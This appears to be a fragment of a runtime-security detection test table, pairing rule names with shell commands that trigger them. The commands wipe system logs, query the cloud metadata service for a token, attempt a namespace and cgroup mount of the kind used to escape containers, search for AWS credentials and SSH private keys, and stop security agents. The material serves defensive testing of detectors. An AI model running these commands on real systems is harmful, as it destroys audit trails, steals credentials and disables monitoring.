column3: rm /var/log/syslog; rm /var/log/messages; rm /var/log/auth.log; rm /var/log/secure; rm /var/log/boot.log; rm /var/log/maillog; rm /var/log/mail.log; rm /var/log/kern.log; rm /var/log/dmesg; rm /var/log/faillog; rm /var/log/cron; rm /var/log/daemon.log; rm /var/log/btmp; rm /var/log/mysqld.log; rm /var/log/mysql.log; rm /var/log/xferlog; sleep infinity

column1: Cloud credentials accessed by network utility
column3: TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/; sleep infinity
unshare -UrmC bash; mount -t cgroup -o memory cgroup /mnt

grep aws_access_key_id ~/.aws/credentials; fgrep secretaccesskey somefile.txt; grep hello file.txt; grep aws_secret_access_key config.txt; find / -name .aws/credentials; mlocate .aws/credentials; locate secrets.txt

column1: Kubernetes service account token created in container
Launch Ingress Remote File Copy Tools in Container
Launch Remote File Copy Tools in Container

column3: find / -name id_rsa; grep "BEGIN RSA PRIVATE KEY" ~/.ssh/id_rsa; find /home -name id_ed25519; egrep "BEGIN OPENSSH PRIVATE KEY" ~/.ssh/id_ed25519; fgrep "BEGIN PRIVATE KEY" ~/.ssh/id_ecdsa
service aliyun.service stop; service apparmor stop; service bcm-agent stop; service aegis stop
